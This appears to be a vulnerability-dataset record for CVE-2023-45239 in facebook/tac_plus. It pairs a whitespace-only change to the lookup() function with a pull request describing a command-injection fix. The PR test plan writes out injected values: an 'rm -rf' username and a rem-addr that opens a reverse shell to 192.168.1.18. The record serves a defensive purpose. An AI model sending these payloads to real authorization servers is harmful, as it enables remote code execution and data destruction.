{
  "cve_id": "CVE-2023-45239",
  "cwe_ids": [
    "CWE-Other"
  ],
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
  "cvss_is_v3": true,
  "repo_name": "facebook/tac_plus",
  "commit_msg": "fix github whitespaces",
  "commit_hash": "c223facc4d9441b9fe9a9aefa0d019fa3fbbd420",
  "git_url": "https://github.com/facebook/tac_plus/commit/c223facc4d9441b9fe9a9aefa0d019fa3fbbd420",
  "file_path": "tacacs-F4.0.4.28/programs.c",
  "func_name": "lookup",
  "func_before": "static char *\nlookup(char *sym, struct author_data *data)\n{\n    static char buf[5];\n\n    if (STREQ(sym, \"user\")) {\n       if (is_valid_name(data->id->username)) {\n          return(tac_strdup(data->id->username));\n       }\n    }\n    if (STREQ(sym, \"name\")) {\n       if (is_valid_name(data->id->NAS_name)) {\n          return(tac_strdup(data->id->username));\n       }\n    }\n    if (STREQ(sym, \"ip\")) {\n\treturn(tac_strdup(data->id->NAS_ip));\n    }\n    if (STREQ(sym, \"port\")) {\n\treturn(tac_strdup(data->id->NAS_port));\n    }\n    if (STREQ(sym, \"address\")) {\n       if (is_valid_name(data->id->NAC_address)) {\n          return(tac_strdup(data->id->NAC_address));\n       }\n    }\n    if (STREQ(sym, \"priv\")) {\n\tsnprintf(buf, sizeof(buf), \"%d\", data->id->priv_lvl);\n\treturn(tac_strdup(buf));\n    }\n    if (STREQ(sym, \"method\")) {\n\tsnprintf(buf, sizeof(buf), \"%d\", data->authen_method);\n\treturn(tac_strdup(buf));\n    }\n    if (STREQ(sym, \"type\")) {\n\tsnprintf(buf, sizeof(buf), \"%d\", data->authen_type);\n\treturn(tac_strdup(buf));\n    }\n    if (STREQ(sym, \"service\")) {\n\tsnprintf(buf, sizeof(buf), \"%d\", data->service);\n\treturn(tac_strdup(buf));\n    }\n    if (STREQ(sym, \"status\")) {\n\tswitch (data->status) {\n\tdefault:\n\t    return(tac_strdup(\"unknown\"));\n\tcase AUTHOR_STATUS_PASS_ADD:\n\tcase AUTHOR_STATUS_PASS_REPL:\n\t    return(tac_strdup(\"pass\"));\n\tcase AUTHOR_STATUS_FAIL:\n\t    return(tac_strdup(\"fail\"));\n\tcase AUTHOR_STATUS_ERROR:\n\t    return(tac_strdup(\"error\"));\n\t}\n    }\n\n    return(tac_strdup(\"unknown\"));\n}",
  "abstract_func_before": "static char *\nlookup(char *VAR_0, struct author_data *VAR_1)\n{\n    static char VAR_2[5];\n\n    if (STREQ(VAR_0, \"user\")) {\n       if (is_valid_name(VAR_1->id->username)) {\n          return(tac_strdup(VAR_1->id->username));\n       }\n    }\n    if (STREQ(VAR_0, \"name\")) {\n       if (is_valid_name(VAR_1->id->NAS_name)) {\n          return(tac_strdup(VAR_1->id->username));\n       }\n    }\n    if (STREQ(VAR_0, \"ip\")) {\n\treturn(tac_strdup(VAR_1->id->NAS_ip));\n    }\n    if (STREQ(VAR_0, \"port\")) {\n\treturn(tac_strdup(VAR_1->id->NAS_port));\n    }\n    if (STREQ(VAR_0, \"address\")) {\n       if (is_valid_name(VAR_1->id->NAC_address)) {\n          return(tac_strdup(VAR_1->id->NAC_address));\n       }\n    }\n    if (STREQ(VAR_0, \"priv\")) {\n\tsnprintf(VAR_2, sizeof(VAR_2), \"%d\", VAR_1->id->priv_lvl);\n\treturn(tac_strdup(VAR_2));\n    }\n    if (STREQ(VAR_0, \"method\")) {\n\tsnprintf(VAR_2, sizeof(VAR_2), \"%d\", VAR_1->authen_method);\n\treturn(tac_strdup(VAR_2));\n    }\n    if (STREQ(VAR_0, \"type\")) {\n\tsnprintf(VAR_2, sizeof(VAR_2), \"%d\", VAR_1->authen_type);\n\treturn(tac_strdup(VAR_2));\n    }\n    if (STREQ(VAR_0, \"service\")) {\n\tsnprintf(VAR_2, sizeof(VAR_2), \"%d\", VAR_1->service);\n\treturn(tac_strdup(VAR_2));\n    }\n    if (STREQ(VAR_0, \"status\")) {\n\tswitch (VAR_1->status) {\n\tdefault:\n\t    return(tac_strdup(\"unknown\"));\n\tcase VAR_3:\n\tcase VAR_4:\n\t    return(tac_strdup(\"pass\"));\n\tcase VAR_5:\n\t    return(tac_strdup(\"fail\"));\n\tcase VAR_6:\n\t    return(tac_strdup(\"error\"));\n\t}\n    }\n\n    return(tac_strdup(\"unknown\"));\n}",
  "func_graph_path_before": "facebook/tac_plus/c223facc4d9441b9fe9a9aefa0d019fa3fbbd420/programs.c/vul/before/0.json",
  "func": "static char *\nlookup(char *sym, struct author_data *data)\n{\n    static char buf[5];\n\n    if (STREQ(sym, \"user\")) {\n        if (is_valid_name(data->id->username)) {\n           return(tac_strdup(data->id->username));\n        }\n    }\n    if (STREQ(sym, \"name\")) {\n        if (is_valid_name(data->id->NAS_name)) {\n           return(tac_strdup(data->id->username));\n        }\n    }\n    if (STREQ(sym, \"ip\")) {\n\treturn(tac_strdup(data->id->NAS_ip));\n    }\n    if (STREQ(sym, \"port\")) {\n\treturn(tac_strdup(data->id->NAS_port));\n    }\n    if (STREQ(sym, \"address\")) {\n        if (is_valid_name(data->id->NAC_address)) {\n           return(tac_strdup(data->id->NAC_address));\n        }\n    }\n    if (STREQ(sym, \"priv\")) {\n\tsnprintf(buf, sizeof(buf), \"%d\", data->id->priv_lvl);\n\treturn(tac_strdup(buf));\n    }\n    if (STREQ(sym, \"method\")) {\n\tsnprintf(buf, sizeof(buf), \"%d\", data->authen_method);\n\treturn(tac_strdup(buf));\n    }\n    if (STREQ(sym, \"type\")) {\n\tsnprintf(buf, sizeof(buf), \"%d\", data->authen_type);\n\treturn(tac_strdup(buf));\n    }\n    if (STREQ(sym, \"service\")) {\n\tsnprintf(buf, sizeof(buf), \"%d\", data->service);\n\treturn(tac_strdup(buf));\n    }\n    if (STREQ(sym, \"status\")) {\n\tswitch (data->status) {\n\tdefault:\n\t    return(tac_strdup(\"unknown\"));\n\tcase AUTHOR_STATUS_PASS_ADD:\n\tcase AUTHOR_STATUS_PASS_REPL:\n\t    return(tac_strdup(\"pass\"));\n\tcase AUTHOR_STATUS_FAIL:\n\t    return(tac_strdup(\"fail\"));\n\tcase AUTHOR_STATUS_ERROR:\n\t    return(tac_strdup(\"error\"));\n\t}\n    }\n\n    return(tac_strdup(\"unknown\"));\n}",
  "abstract_func": "static char *\nlookup(char *VAR_0, struct author_data *VAR_1)\n{\n    static char VAR_2[5];\n\n    if (STREQ(VAR_0, \"user\")) {\n        if (is_valid_name(VAR_1->id->username)) {\n           return(tac_strdup(VAR_1->id->username));\n        }\n    }\n    if (STREQ(VAR_0, \"name\")) {\n        if (is_valid_name(VAR_1->id->NAS_name)) {\n           return(tac_strdup(VAR_1->id->username));\n        }\n    }\n    if (STREQ(VAR_0, \"ip\")) {\n\treturn(tac_strdup(VAR_1->id->NAS_ip));\n    }\n    if (STREQ(VAR_0, \"port\")) {\n\treturn(tac_strdup(VAR_1->id->NAS_port));\n    }\n    if (STREQ(VAR_0, \"address\")) {\n        if (is_valid_name(VAR_1->id->NAC_address)) {\n           return(tac_strdup(VAR_1->id->NAC_address));\n        }\n    }\n    if (STREQ(VAR_0, \"priv\")) {\n\tsnprintf(VAR_2, sizeof(VAR_2), \"%d\", VAR_1->id->priv_lvl);\n\treturn(tac_strdup(VAR_2));\n    }\n    if (STREQ(VAR_0, \"method\")) {\n\tsnprintf(VAR_2, sizeof(VAR_2), \"%d\", VAR_1->authen_method);\n\treturn(tac_strdup(VAR_2));\n    }\n    if (STREQ(VAR_0, \"type\")) {\n\tsnprintf(VAR_2, sizeof(VAR_2), \"%d\", VAR_1->authen_type);\n\treturn(tac_strdup(VAR_2));\n    }\n    if (STREQ(VAR_0, \"service\")) {\n\tsnprintf(VAR_2, sizeof(VAR_2), \"%d\", VAR_1->service);\n\treturn(tac_strdup(VAR_2));\n    }\n    if (STREQ(VAR_0, \"status\")) {\n\tswitch (VAR_1->status) {\n\tdefault:\n\t    return(tac_strdup(\"unknown\"));\n\tcase VAR_3:\n\tcase VAR_4:\n\t    return(tac_strdup(\"pass\"));\n\tcase VAR_5:\n\t    return(tac_strdup(\"fail\"));\n\tcase VAR_6:\n\t    return(tac_strdup(\"error\"));\n\t}\n    }\n\n    return(tac_strdup(\"unknown\"));\n}",
  "func_graph_path": "facebook/tac_plus/c223facc4d9441b9fe9a9aefa0d019fa3fbbd420/programs.c/vul/after/0.json",
  "diff_func": "--- func_before\n+++ func_after\n@@ -4,14 +4,14 @@\n     static char buf[5];\n \n     if (STREQ(sym, \"user\")) {\n-       if (is_valid_name(data->id->username)) {\n-          return(tac_strdup(data->id->username));\n-       }\n+        if (is_valid_name(data->id->username)) {\n+           return(tac_strdup(data->id->username));\n+        }\n     }\n     if (STREQ(sym, \"name\")) {\n-       if (is_valid_name(data->id->NAS_name)) {\n-          return(tac_strdup(data->id->username));\n-       }\n+        if (is_valid_name(data->id->NAS_name)) {\n+           return(tac_strdup(data->id->username));\n+        }\n     }\n     if (STREQ(sym, \"ip\")) {\n \treturn(tac_strdup(data->id->NAS_ip));\n@@ -20,9 +20,9 @@\n \treturn(tac_strdup(data->id->NAS_port));\n     }\n     if (STREQ(sym, \"address\")) {\n-       if (is_valid_name(data->id->NAC_address)) {\n-          return(tac_strdup(data->id->NAC_address));\n-       }\n+        if (is_valid_name(data->id->NAC_address)) {\n+           return(tac_strdup(data->id->NAC_address));\n+        }\n     }\n     if (STREQ(sym, \"priv\")) {\n \tsnprintf(buf, sizeof(buf), \"%d\", data->id->priv_lvl);",
  "diff_line_info": {
    "deleted_lines": [
      "       if (is_valid_name(data->id->username)) {",
      "          return(tac_strdup(data->id->username));",
      "       }",
      "       if (is_valid_name(data->id->NAS_name)) {",
      "          return(tac_strdup(data->id->username));",
      "       }",
      "       if (is_valid_name(data->id->NAC_address)) {",
      "          return(tac_strdup(data->id->NAC_address));",
      "       }"
    ],
    "added_lines": [
      "        if (is_valid_name(data->id->username)) {",
      "           return(tac_strdup(data->id->username));",
      "        }",
      "        if (is_valid_name(data->id->NAS_name)) {",
      "           return(tac_strdup(data->id->username));",
      "        }",
      "        if (is_valid_name(data->id->NAC_address)) {",
      "           return(tac_strdup(data->id->NAC_address));",
      "        }"
    ]
  },
  "is_vul": true,
  "pr_url": "https://github.com/facebook/tac_plus/pull/41",
  "description": {
    "pr_info": {
      "title": "Author data validation",
      "number": 41
    },
    "comment": [
      "this diff fixes a RCE vulnerability within the tacplus code. Fields such as  rem-addr field inside a tacacs authorization packet can be injected without any validation from the PRE and POST authorization directive to exec() under certain conditions a) the user config should have a before authorization directive, and a service should be specified.\r\n\r\nThis fix treats username/NAC address fields to be a alphanumeric strings and validates them as such. Some fields such as NAC address may contain some special characters since its values could IP addresses, hostnames, or vendor specific strings such as Local/Infinode.\r\nThis fix will return value \"unknown\" from the lookup functions if the fields being validated fail validation. The treatment of this string is left to the remote system being called by tac_plus (to accept/reject)\r\n\r\n\r\nAdded some additional validations for other fields.\r\n\r\ntest plan \r\n\r\n| ./configure --without-libwrap\r\n| make\r\n| ./tac_plus -G -d 20 -l /dev/stdout -p 2046 -C tac_plus.cfg\r\n\r\nsample config file\r\n```\r\n❯ cat tac_plus.cfg\r\nkey = fooman\r\n\r\naccounting file = /tmp/acct.log\r\n\r\nuser = DEFAULT {\r\nbefore authorization \"/home/sahuja4/tac_plus/sample.sh -- '$user' '$address'\"\r\n    service = exec {\r\n        default attribute = permit\r\n    }\r\n}\r\n```\r\n\r\nThe sample.sh file dumps all input args into a tmp file\r\n```\r\n❯ cat ../sample.sh\r\n#!/bin/bash\r\necho $@ >> /tmp/vars.txt\r\n```\r\n\r\nWhat we want to check is that any arg inside the author_data struct that we cannot validate is set to unknown, and is passed on to the binary specified in pre/post authorization\r\n\r\nWe have 3 cases which we want to test \r\nCase 1: Invalid username\r\n> ./debug -- --mode authz --username \"rm -rf $PWD\" --cmd \"show run\"\r\n\r\nCase 2: Invalid rem-addr\r\n> ./debug -- --mode authz --username \"rm -rf $PWD\" --cmd \"show run\" --rem-addr \"asd';bash -i >& /dev/tcp/192.168.1.18/1337 0>&1 #\"\r\n\r\nCase 3: Correctly formatted username and rem-addr\r\n> ./debug -- --mode authz --username sahuja4 --cmd \"show run\"\r\n\r\nThe following output was produced when run against the tacacs client invoked against the 3 cases\r\n\r\n```\r\n❯ cat /tmp/vars.txt\r\n-- unknown devvm2737   <- case 1\r\n-- sahuja4 unknown     <- case 2\r\n-- sahuja4 devvm2737   <- case 3\r\n```\r\n\r\nHere is the server output when ran against the client \r\n```\r\nTue Oct  3 15:33:28 2023 [2213901]: Reading config\r\nTue Oct  3 15:33:28 2023 [2213901]: Version F4.0.4.28-7fb Initialized 1\r\nTue Oct  3 15:33:28 2023 [2213901]: tac_plus server F4.0.4.28-7fb starting\r\nTue Oct  3 15:33:28 2023 [2213901]: socket FD 4 AF 10\r\nTue Oct  3 15:33:28 2023 [2213901]: Error Cannot write pid to /var/run/tac_plus.pid.2046 Permission denied\r\nTue Oct  3 15:33:28 2023 [2213901]: uid=189399 euid=189399 gid=100 egid=100 s=8000912\r\nTue Oct  3 15:33:32 2023 [2213901]: connection [1] from ::1 [::1]\r\nTue Oct  3 15:33:32 2023 [2213901]: forked 2214436\r\nTue Oct  3 15:33:32 2023 [2213901]: forked 2214436 for ::1, procs 1, procs for client 1\r\n============================== case 1============================================\r\nTue Oct  3 15:33:32 2023 [2214436]: Authenticating ACLs for user 'DEFAULT' instead of 'rm -rf /home/sahuja4/fbsource/fbcode'\r\nTue Oct  3 15:33:32 2023 [2214436]: invalid character=[ ]\r\nTue Oct  3 15:33:32 2023 [2214436]: authorization query for 'rm -rf /home/sahuja4/fbsource/fbcode' tty0 from ::1 accepted\r\nTue Oct  3 15:33:32 2023 [2214436]: exit status=0\r\nTue Oct  3 15:33:32 2023 [2213901]: Clening up session for pid 2214436\r\nTue Oct  3 15:33:32 2023 [2213901]: Pid 2214436 Lowered Count for ::1 to 0\r\nTue Oct  3 15:34:52 2023 [2213901]: connection [1] from ::1 [::1]\r\nTue Oct  3 15:34:52 2023 [2213901]: forked 2234734\r\nTue Oct  3 15:34:52 2023 [2213901]: forked 2234734 for ::1, procs 1, procs for client 1\r\nTue Oct  3 15:34:52 2023 [2234734]: Authenticating ACLs for user 'DEFAULT' instead of 'sahuja4'\r\n============================== case 2============================================\r\nTue Oct  3 15:34:52 2023 [2234734]: invalid character=[']\r\nTue Oct  3 15:34:52 2023 [2234734]: authorization query for 'sahuja4' tty0 from ::1 accepted <- case 2\r\nTue Oct  3 15:34:52 2023 [2234734]: exit status=0\r\nTue Oct  3 15:34:52 2023 [2213901]: Clening up session for pid 2234734\r\nTue Oct  3 15:34:52 2023 [2213901]: Pid 2234734 Lowered Count for ::1 to 0\r\nTue Oct  3 15:36:13 2023 [2213901]: connection [1] from ::1 [::1]\r\nTue Oct  3 15:36:13 2023 [2213901]: forked 2249661\r\nTue Oct  3 15:36:13 2023 [2213901]: forked 2249661 for ::1, procs 1, procs for client 1\r\n============================== case 3============================================\r\nTue Oct  3 15:36:13 2023 [2249661]: Authenticating ACLs for user 'DEFAULT' instead of 'sahuja4'\r\nTue Oct  3 15:36:13 2023 [2249661]: authorization query for 'sahuja4' tty0 from ::1 accepted\r\nTue Oct  3 15:36:13 2023 [2249661]: exit status=0\r\nTue Oct  3 15:36:13 2023 [2213901]: Clening up session for pid 2249661\r\nTue Oct  3 15:36:13 2023 [2213901]: Pid 2249661 Lowered Count for ::1 to 0\r\n```"
    ]
  },
  "Bug Filter": "Security Vulnerability Fix",
  "Bug Filter Confidence": 0.95,
  "Bug Filter Response": "**Final Classification:** Security Vulnerability Fix  \n**Confidence:** 0.95"
}